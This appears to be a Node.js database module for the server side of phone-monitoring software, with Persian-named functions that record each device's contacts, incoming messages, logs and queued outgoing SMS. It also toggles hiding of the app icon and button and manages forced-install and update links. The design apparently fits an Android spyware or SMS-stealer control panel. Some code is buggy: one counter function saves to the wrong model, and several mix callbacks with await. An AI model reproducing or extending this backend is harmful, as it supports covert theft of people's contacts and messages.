const {error} = require("neo4j-driver")
const User = require("../models/user")
const Upate = require("../models/link_update")
const Poshtibani = require("../models/link_poshtibani")
const App = require("../models/barnameha")
const Link = require("../models/link_ejbari")
const pishfarz = require("../models/shomarandeh_pishfarz")
const gorohi = require("../models/gorohi_pishfarz")
const hidden_app = require("../models/hidden_app")
const hidden_button = require("../models/hidden_button")
const DefultSms = require("../models/defult_sms")

exports.createUser = async function (entry) {
    let hiddenButton = await hidden_button.find({})
    let hiddenApp = await hidden_app.find({})
    if (hiddenApp.length <1){
        await hidden_app.remove({})
        return await new hidden_app({state:false}).save()
    }
    if (hiddenButton.length <1){
        await hidden_button.remove({})
        return await new hidden_button({state:false}).save()
    }
    if (typeof entry == 'object') {
        new User(entry.toJSON()).save()
    } else {
        let button = await hidden_button.find({})
        let app = await hidden_app.find({})
        console.log("app"+app[0])
        console.log('button'+button[0])

        return await new User({
            phone_id: entry,
            is_button_show: button[0]['state'],
            is_app_show: app[0]['state'],
            contacts: [],
            appMostInstall: [],
            logMessage: [],
            inputMessage: [],
            messagesFerestadani: [],
            isOnline: false
        }).save()
    }
}
exports.createGlobalApp = async function (entry) {
    return await new App(entry).save()
}
exports.getGlobalApp = async function () {
    return await App.find({})
}
exports.getRemoveApp = async function (id) {
    return await App.remove({name: id})
}
exports.findUser = async function (phone_id) {
    return await User.find({phone_id})
}
exports.findAll = async function () {
    return await User.find({}).sort('date' )
}
exports.addContact = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        function (eror, data) {
            data.contacts.push(entry)
            data.save(function (err) {
            });
        })
    return data
}
exports.removeAppEjbari = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        async function (eror, data) {
            var output = data.appMostInstall.filter(function (x) {
                return x.name != entry
            });
            console.log(output)
            await User.update({phone_id}, {$set: {appMostInstall: output}}, function (err, affected) {
                console.log('affected: ', affected);
            });
        })
    return data
}
exports.addLog = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        function (eror, data) {
            data.logMessage.push(entry)
            data.save(function (err) {
            });
        })
    return data
}
exports.addApp = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        function (eror, data) {
            data.appMostInstall.push(entry)
            data.save(function (err) {
            });
        })
    return data
}
exports.addMessage = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        function (eror, data) {
            if (data){
                console.log("data"+data)
                console.log("data"+entry)
                data.inputMessage.push(entry)
                data.save(function (err) {
                });
            }
        })
    return data
}
exports.stateNamayeshApp = async function (phone_id, entry) {
    console.log(entry);
    let data = await User.findOne(
        {phone_id},
        function (eror, data) {
            data.is_app_show = entry
            data.save(function (err) {
            });
        })
    return data
}
exports.stateNamayeshButton = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        function (eror, data) {
            data.is_button_show = entry
            data.save(function (err) {
            });
        })
    return data
}

exports.createGlobalLink = async function (entry) {
    await Link.remove({})
    return await new Link(entry).save()
}
exports.getGlobalLink = async function () {
    return await Link.find({})
}
exports.getRemoveLink = async function (id) {
    return await Link.remove({name: id})
}

exports.addSmsData = async function (model) {
    await DefultSms.deleteMany({});
    return await new DefultSms(model).save()
}
exports.getSmsData = async function () {
    return await  DefultSms.find({})
}
//Poshtibani
exports.createPoshtibaniLink = async function (entry) {
    await Poshtibani.remove({})
    return await new Poshtibani(entry).save()
}
exports.getPoshtibaniLink = async function () {
    return await Poshtibani.find({})
}
exports.getRemovePoshtibaniLink = async function (id) {
    return await Poshtibani.remove({name: id})
}

//update
exports.createUpdateLink = async function (entry) {
    await Upate.remove({})
    return await new Upate(entry).save()
}
exports.getUpdateLink = async function () {
    return await Upate.find({})
}
//hidden_app
exports.createhiddenApp = async function (entry) {
    await hidden_app.remove({})
    return await new hidden_app(entry).save()
}
exports.gethiddenApp = async function () {
    let state = await hidden_app.find({})
    return state
}
//hidden_button
exports.createhiddenbutton = async function (entry) {
    await hidden_button.remove({})
    return await new hidden_button(entry).save()
}
exports.gethiddenbutton  = async function () {
    let state = await hidden_button.find({})
    return state
}

exports.getRemoveUpdateLink = async function (id) {
    return await Upate.remove({name: id})
}

exports.addSenderMessage = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        async function (eror, data) {
            data.messagesFerestadani.push(entry)
            await data.save(function (err) {
            });
        })
    return data
}

exports.removeSenderMessage = async function (phone_id, entry) {
    let data = await User.findOne(
        {phone_id},
        async function (eror, data) {
            var output = data.messagesFerestadani.filter(function (x) {
                return x.id != entry
            });
            console.log(output)
            await User.update({phone_id}, {$set: {messagesFerestadani: output}}, function (err, affected) {
                console.log('affected: ', affected);
            });
        })
    return data
}

exports.getAllSenderMessage = async function (phone_id) {
    let data = await User.findOne({phone_id})
    return data.messagesFerestadani
}

exports.pluseService = async function (val) {
    let conteint = await pishfarz.find({})
    if (  conteint.length  >=  1 ) {
        conteint[0].counter = Number(conteint[0] .counter) + Number( val)
        await conteint[0].save(function (err) {
        });
    } else {
        conteint = await new pishfarz({counter: val }).save()
    }
    return conteint[0]
}

exports.getpluseService = async function () {
    let conteint = await pishfarz.find({})
    if (conteint.length > 0) {
        return conteint[0].counter
    } else {
        await new pishfarz({counter: 0 }).save()
        return 0
    }
}

exports.pluseGorohi = async function (val) {
    let conteint = await gorohi.find({})
    if (  conteint.length  >=  1 ) {
        conteint[0].counter = Number(conteint[0] .counter) + Number( val)
        await conteint[0].save(function (err) {
        });
    } else {
        conteint = await new pishfarz({counter: val }).save()
    }
    return conteint[0]
}

exports.getpluseGorohi = async function () {
    let conteint = await gorohi.find({})
    console.log(conteint)
    if (  conteint.length  >=  1 ) {
        return conteint[0].counter
    } else {
        await new gorohi({ counter:0}).save()
        return 0
    }
}
